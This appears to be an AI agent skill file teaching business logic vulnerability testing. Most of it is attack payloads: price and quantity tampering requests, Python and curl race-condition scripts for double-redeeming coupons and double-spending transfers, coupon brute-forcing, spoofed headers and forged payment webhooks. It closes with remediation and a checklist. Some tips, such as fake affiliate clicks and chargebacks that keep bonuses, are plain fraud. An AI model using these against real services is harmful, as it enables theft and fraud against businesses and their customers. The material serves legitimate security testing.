---
name: business-logic
description: >
  Expert guidance for finding, exploiting, and remediating business logic vulnerabilities. Covers
  price manipulation, race conditions, workflow bypass, coupon/voucher abuse, negative values,
  integer overflow, step skipping, trust boundary violations, time-of-check-time-of-use (TOCTOU),
  parameter pollution, state machine bypass, feature abuse, and account lifecycle flaws. Use this
  skill whenever the user mentions business logic bugs, logic flaws, workflow bypass, price
  manipulation, coupon abuse, race condition exploitation, negative values in purchases, integer
  overflow in business context, multi-step flow bypass, TOCTOU, account lifecycle flaws, feature
  abuse, or any vulnerability that isn't a classic injection/auth bug but exploits the app's
  intended design. Also trigger for "bypass checkout", "abuse discount codes", "race condition
  purchase", "negative price attack", "skip verification step". Always use this skill for
  application logic and workflow security testing.
---

# Business Logic Vulnerabilities Skill

Business logic flaws exploit the intended functionality of an application — not implementation
bugs. Scanners can't find them; they require understanding the business flow and thinking creatively
about how legitimate features can be abused.

---

## 1. Attack Surface Map — Start Here

| Scenario | Section |
|----------|---------|
| Price & value manipulation | §3.1 |
| Race conditions | §3.2 |
| Coupon / voucher / promo abuse | §3.3 |
| Multi-step workflow bypass | §3.4 |
| Negative & boundary values | §3.5 |
| Trust & privilege assumption flaws | §3.6 |
| Account lifecycle abuse | §3.7 |
| Feature interaction flaws | §3.8 |
| Time-based logic flaws | §3.9 |
| State machine abuse | §3.10 |
| Data-dependent logic flaws | §3.11 |
| Referral / affiliate abuse | §3.12 |

---

## 2. Core Concepts

- **Implicit trust** — App assumes a value can't be tampered (price, status, role in request body).
- **State machine** — App enforces a sequence of steps — can steps be skipped or reordered?
- **TOCTOU** — Time-of-check-time-of-use: race between validation and execution.
- **Boundary conditions** — Values at edges of ranges behave differently (zero, negative, max int).
- **Feature interaction** — Two legitimate features combined produce unintended results.

---

## 3. Attack Techniques

### 3.1 Price & Value Manipulation

```bash
# Modify price in request body (server trusts client-supplied price)
POST /api/checkout
{"items":[{"id":"prod-1","qty":1,"price":0.01}]}   # change price to 0.01

# Zero price
{"price": 0}

# Negative price (subtract from total)
POST /api/add-to-cart
{"product_id":"item1","price":-99.99,"qty":1}
# If server sums prices → total goes down!

# Modify total instead of line items
POST /api/place-order
{"order_id":"ORD-555","total":0.01,"currency":"USD"}

# Currency manipulation
POST /api/checkout
{"amount":100,"currency":"USD"}
→ try: {"amount":100,"currency":"JPY"}   # 100 JPY ≈ $0.70

# Quantity manipulation
{"qty":-1}           # negative quantity
{"qty":0}            # zero quantity but still shipped
{"qty":99999999}     # overflow to 0 or negative

# Weight/shipping manipulation
{"weight":0}   {"shipping_class":"free"}

# Cart total recalculation bypass
# Add item → note total → add coupon → check if coupon applies to modified total
# Then remove coupon → add item at lower price separately
```

---

### 3.2 Race Conditions

```bash
# Classic TOCTOU: check balance → deduct → check happens before deduct completes

# Single-use code race (coupon, gift card, password reset)
python3 - << 'EOF'
import threading, requests, time

URL    = "https://target.com/api/redeem"
COOKIE = "session=YOUR-SESSION-TOKEN"
CODE   = "GIFTCARD-50"
N      = 20   # concurrent requests

results = []
lock = threading.Lock()

def redeem():
    r = requests.post(URL,
                      json={"code": CODE},
                      headers={"Cookie": COOKIE})
    with lock:
        results.append((r.status_code, r.text[:100]))

# Fire N requests simultaneously
threads = [threading.Thread(target=redeem) for _ in range(N)]
for t in threads: t.start()
for t in threads: t.join()

for status, body in results:
    print(f"{status}: {body}")
EOF

# Transfer race (double-spend)
python3 - << 'EOF'
import threading, requests

URL = "https://target.com/api/transfer"
HEADERS = {"Cookie": "session=TOKEN", "Content-Type":"application/json"}

def transfer():
    requests.post(URL, json={"to_user":9999,"amount":1000}, headers=HEADERS)

# Transfer same balance to two accounts simultaneously
t1 = threading.Thread(target=transfer)
t2 = threading.Thread(target=transfer)
t1.start(); t2.start()
t1.join(); t2.join()
EOF

# Vote/Like race (cast multiple votes)
for i in $(seq 1 50); do
  curl -s -X POST "https://target.com/api/posts/42/vote" \
       -H "Cookie: session=TOKEN" &
done; wait

# Limit bypass race (API rate limit, file quota)
# Send requests simultaneously to exceed per-user limit before it's enforced
for i in $(seq 1 100); do
  curl -s "https://target.com/api/limited-action" -H "Cookie: session=TOKEN" &
done; wait
```

---

### 3.3 Coupon / Voucher / Promo Abuse

```bash
# 1. Reuse single-use codes
POST /api/apply-coupon  {"code":"SAVE50"}
# → Apply, checkout, then apply again on next order

# 2. Race condition — apply before marked as used (see §3.2)

# 3. Apply multiple coupons
POST /api/apply-coupon  {"code":"SAVE10"}
POST /api/apply-coupon  {"code":"SAVE20"}
POST /api/apply-coupon  {"code":"WELCOME50"}
# Each might stack if app doesn't enforce single-coupon

# 4. Coupon enumeration — brute force valid codes
for code in SAVE10 SAVE20 SAVE50 PROMO10 LAUNCH50 WINTER20 VIP100; do
  result=$(curl -s -X POST "https://target.com/api/apply-coupon" \
                -d "{\"code\":\"$code\"}" \
                -H "Cookie: session=TOKEN")
  echo "$code: $result"
done

# 5. Apply coupon after price is locked
# Start checkout → lock price → apply coupon retroactively?

# 6. Cross-account coupon
# Your coupon applied to another user's account?
POST /api/apply-coupon  {"code":"MYCOUPON","account_id":1338}

# 7. Expired coupon
POST /api/apply-coupon  {"code":"EXPIRED2020","expiry_override":true}
# Modify expiry in request if server trusts it

# 8. Self-referral abuse
# Refer yourself to get a bonus
POST /api/refer  {"email":"attacker2@gmail.com"}   # alternate email
POST /api/refer  {"email":"attacker+1@gmail.com"}  # email alias trick
```

---

### 3.4 Multi-Step Workflow Bypass

```bash
# Map the full workflow first:
# 1. Add to cart → 2. Enter address → 3. Select shipping → 4. Payment → 5. Confirm

# Skip steps by going directly to later steps
# Jump from step 1 to step 5
POST /api/orders/confirm
{"order_id":"NEW-ORDER","payment":"completed","bypass":true}

# Skip email verification
# Register → skip /verify-email → attempt to access verified-only features
POST /api/register   {"email":"x@x.com","password":"test"}
GET  /api/premium-feature   (without verifying email)

# Skip payment in purchase flow
# Add to cart → initiate checkout → skip payment step → confirm order
POST /api/checkout/initiate   {"order_id":"ORD-555"}
# Don't do payment
POST /api/checkout/complete   {"order_id":"ORD-555"}

# Skip admin approval
# Submit for approval → test accessing resource before approval
POST /api/withdraw/request  {"amount":1000}
GET  /api/withdraw/ORD-555/process   (before admin approval)

# Replay confirmation of another order
# Complete order A, capture confirm request
# Modify order_id to B (unpaid order)
POST /api/orders/mark-paid  {"order_id":"ORD-UNPAID"}

# Forced browsing to later steps
GET /checkout/step4   (without completing steps 1-3)
GET /onboarding/complete   (without completing onboarding)
```

---

### 3.5 Negative & Boundary Values

```bash
# Negative numbers
{"qty": -1}             # might result in refund?
{"amount": -100}        # negative transfer = receive money
{"price": -99.99}       # subtract from cart total
{"discount": -50}       # add to price instead of subtract

# Zero values
{"qty": 0}              # 0 items but order processed?
{"price": 0}            # free item?
{"amount": 0}           # transfer 0 but fee applied?

# Max values (integer overflow)
{"qty": 2147483648}     # INT_MAX + 1 → wraps to -2147483648
{"amount": 9999999999}
{"balance": 9999999999999999}

# Float precision
{"price": 0.001}        # rounds to 0 in some systems
{"discount": 99.9999}   # rounds to 100 = free?

# Off-by-one
{"qty": 101}   # if limit is 100
{"age": 17}    # if minimum age is 18
{"score": -1}  # if minimum score is 0

# Empty/null values
{"payment_method": null}
{"shipping_address": ""}
{"user_id": ""}
```

---

### 3.6 Trust & Privilege Assumption Flaws

```bash
# Server trusts client-supplied values it should compute:

# Trust user-supplied role/status
POST /api/register
{"username":"x","role":"admin","verified":true,"premium":true}

# Trust user-supplied IP for access control
GET /internal/admin
X-Forwarded-For: 127.0.0.1
X-Real-IP: 192.168.1.1

# Trust user-supplied "source" to bypass restrictions
POST /api/transfer
{"amount":10000,"source":"internal_transfer","bypass_limit":true}

# Trust payment provider callback without verification
POST /webhook/payment-complete
{"order_id":"ORD-555","status":"paid","amount":100}
# → Server marks order as paid without verifying with payment provider

# Trust user-supplied timestamps
POST /api/transaction
{"timestamp":"2019-01-01","expires":"2099-01-01"}

# Assume first-time user
POST /api/new-user-discount
{"is_new_user":true}  # even though account is old

# Trust user-supplied "is_free" field
POST /api/apply-for-trial
{"plan":"enterprise","is_trial":true,"duration_days":365}
```

---

### 3.7 Account Lifecycle Abuse

```bash
# 1. Use deleted/deactivated account
# Delete account → try logging in with old token
# Some apps don't invalidate sessions on deletion

# 2. Email change race
# Change email → confirm → change again before old confirmation expires?
# Can confirm both email addresses?

# 3. Password reset token abuse
# Request reset → don't use token → change password normally → use old token?
POST /api/reset-password  {"token":"OLD-TOKEN","new_password":"hacked"}

# 4. Account takeover via email collision
# Register: user@evil.com  ← your account
# Register: USER@evil.com  ← if case-insensitive → overwrite?
# Or: user+admin@evil.com if app strips + suffix

# 5. Verification bypass
# Register → verify email → change email to victim's email → still verified?

# 6. Inactive account reactivation
# Reactivate account should require re-verification — test if it doesn't

# 7. Invite link abuse
# Invite link: /register?invite=TOKEN
# Use same invite multiple times
# Use invite after it should expire
# Enumerate invite tokens (sequential?)

# 8. Merge account abuse
# Merge account A into B → does B inherit A's privileges?
# Merge guest cart into logged-in cart → steal items?
```

---

### 3.8 Feature Interaction Flaws

```bash
# Two features that individually are safe but combine to create a vulnerability

# 1. Search + Export
# Search returns 10 results (paginated)
# Export ignores pagination → exports all records including others' data

# 2. Referral + Free Trial
# Refer yourself → both accounts get free trial
# Refer chain: A refers B refers C refers A (circular referral for infinite credits)

# 3. Password Reset + Account Merge
# Reset password for email X
# Merge account with email X into attacker's account
# → Attacker gets control

# 4. Coupon + Refund
# Apply coupon → buy item at discount → refund item at full price
# Net gain = coupon value

# 5. API Pagination + Ordering
# /api/users?sort=password (sort by sensitive field — leaks ordering)
# /api/transactions?sort=amount&order=desc&limit=1   (highest transaction)

# 6. Public Share + Private Data
# Share a "view" link → shared link shows more data than expected
# Shared link + parameter tweak → full data access

# 7. Notification + Data Enumeration
# "Email already in use" notification → username/email enumeration
# "Account locked" vs "Invalid password" → confirms account exists
```

---

### 3.9 Time-Based Logic Flaws

```bash
# 1. Flash sale race — buy at sale price after sale ends
# Monitor for flash sale → queue request → fire slightly after sale ends

# 2. Session token not expiring
# Use token issued days/weeks ago → still valid?

# 3. Trial period restart
# Delete account → re-register → get new trial

# 4. Subscription end-of-day abuse
# Subscribe → use feature extensively just before billing
# Cancel → re-subscribe → repeat

# 5. Rate limit window exploitation
# Rate limit: 10 requests per minute
# Send 10 requests at 00:59 → send 10 more at 01:00 → 20 in 1 second

# 6. Scheduled job exploitation
# Know when cleanup/audit job runs → exploit in the window before it runs
# E.g., upload 1000 files, all get cleaned at midnight → re-upload immediately after

# 7. Password reset token expiry
# Does "1 hour expiry" start at request time or sent time?
# Server time vs client time discrepancy
```

---

### 3.10 State Machine Abuse

```bash
# Map all states an object can be in and test illegal transitions

# Order states: draft → submitted → paid → shipped → delivered → refunded
# Illegal transitions to test:
# draft → shipped (skip payment)
# delivered → paid (claim unpaid after delivery)
# refunded → delivered (re-deliver after refund)

POST /api/orders/ORD-555/mark-shipped   (while status=draft)
POST /api/orders/ORD-555/refund         (while status=draft/submitted)
POST /api/orders/ORD-555/pay            (after already shipped)

# User account states: pending → active → suspended → deleted
# Test: suspended → active (self-reactivate without admin)
POST /api/account/reactivate   {"reason":"I'm good now"}

# Ticket/Support states: open → in_progress → resolved → closed
# Reopen closed ticket with modified content?
# Skip to resolved without proper workflow?

# Document states: draft → review → approved → published
# Publish without approval:
POST /api/documents/123/publish   (while status=draft)
```

---

### 3.11 Data-Dependent Logic Flaws

```bash
# Logic that behaves differently based on data values

# 1. Free shipping threshold manipulation
# Free shipping at $50 → add $50 item → remove expensive item → keep free shipping?
# Add cheap items to hit $50 → coupon brings below $50 → still free shipping?

# 2. Tier/level upgrade abuse
# Earn points to reach level 2 → claim level 2 reward → refund purchases
# Net result: level 2 reward without paying

# 3. Percentage discount on zero
# Apply 100% discount → price = 0 → checkout

# 4. Dependent field bypass
# Field B is only shown/required when field A = X
# POST directly with field B even when field A ≠ X

# 5. Conditional feature access
# Feature unlocked when subscription = premium
# Subscribe for 1 month → use feature → cancel → feature still accessible?

# 6. Input that changes processing path
# {"type":"admin_request","data":"..."}  ← type changes backend logic
# {"action":"internal","priority":"high"} ← internal actions not meant for external
```

---

### 3.12 Referral & Affiliate Abuse

```bash
# 1. Self-referral
# Use own referral code → get both referrer and referee bonus
# Use alternate email, VPN, different device

# 2. Circular referral chain
# A refers B, B refers C, C refers A → infinite credits

# 3. Referral code enumeration
# Sequential codes: REF001, REF002 ...
# Get credit for someone else's referral code?

# 4. Commission fraud (affiliate)
# Generate fake clicks/signups for your affiliate link
# Use own referral link for own purchases

# 5. Bonus stacking
# Referral bonus + welcome bonus + first purchase bonus
# All apply simultaneously?

# 6. Chargeback + referral keep
# Get referral bonus → purchase → chargeback → keep bonus?
```

---

## 4. Logic Flaw Test Methodology

```
For each feature:
1. Map all inputs and parameters
2. Ask: "What happens if I change this to something unexpected?"
3. Ask: "What's the sequence? Can I skip or repeat a step?"
4. Ask: "What if I do two things at exactly the same time?"
5. Ask: "What if this is zero, negative, or maximum?"
6. Ask: "What does this feature do combined with that other feature?"
7. Ask: "What assumption is the developer making that I can violate?"
```

---

## 5. Remediation

1. **Server-side validation** — Never trust client-supplied values for prices, quantities, status.
2. **Recompute totals server-side** — Don't use client-submitted totals.
3. **Atomic transactions** — Use database transactions to prevent race conditions.
4. **Idempotency keys** — Prevent duplicate submissions of the same request.
5. **State machine enforcement** — Explicitly validate allowed state transitions.
6. **Negative value rejection** — Validate all numeric inputs ≥ minimum allowed.
7. **Coupon single-use enforcement** — Mark as used atomically before processing.
8. **Verify payment callbacks** — Call payment provider API to verify payment, don't trust webhook body.
9. **Rate limiting per user per feature** — Not just per IP.

---

## 6. Business Logic Testing Checklist

- [ ] Map all user-facing features and their workflows
- [ ] Identify all numeric inputs — test negative, zero, max values
- [ ] Find all multi-step workflows — test skipping each step
- [ ] Identify all coupons/codes — test reuse, stacking, expired
- [ ] Test race conditions on: redeem, transfer, vote, purchase
- [ ] Find all user-supplied values the server trusts — price, status, role
- [ ] Test payment webhook with fake "paid" status
- [ ] Test feature interactions: export + search, coupon + refund, trial + referral
- [ ] Test account lifecycle: delete + reuse, email change, verification skip
- [ ] Test state machine: illegal transitions between states
- [ ] Test time-based flaws: rate limit windows, trial restarts, session expiry
- [ ] Test referral abuse: self-referral, circular chains, enumeration
- [ ] Test privilege assumptions: X-Forwarded-For, internal flags, bypass params
